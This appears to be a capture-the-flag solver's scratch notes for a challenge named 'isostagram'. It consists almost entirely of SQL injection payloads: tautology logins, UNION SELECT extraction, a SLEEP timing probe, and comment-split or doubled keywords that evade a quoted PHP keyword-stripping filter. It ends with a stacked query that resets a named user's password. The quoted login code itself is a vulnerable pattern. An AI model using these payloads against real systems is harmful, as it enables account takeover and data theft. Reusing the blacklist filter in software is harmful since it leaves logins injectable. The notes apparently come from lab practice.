# isostagram
- its probably sql injection

- these crash the site
admin") or "1"="1"/*  
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055  
UNION ALL SELECT NULL#  
ORDER BY 1,SLEEP(5)#  
AS INJECTX WHERE 1=1 AND 1=1  
' or 1=1 --  


$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";

'AS INJECTX W/**/HERE 1=1 AND 1=1 LIMIT 1 --
' o/**/r 1=1 limit 1; --
' o/**/r 1=1; --
* LIMIT 1

1' O/**/R '1' = '1

1' UN/**/ION ALL SEL/**/ECT * FROM users LIMIT 1--
kita0421
UPDATE users SET `password`='123';--
WHERE some_column=some_value;

```SQL
' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--
AS INJECTX WHE/**/RE 1=1 AND 1=1  
1' OORR '1' = '1' limit 1; --
```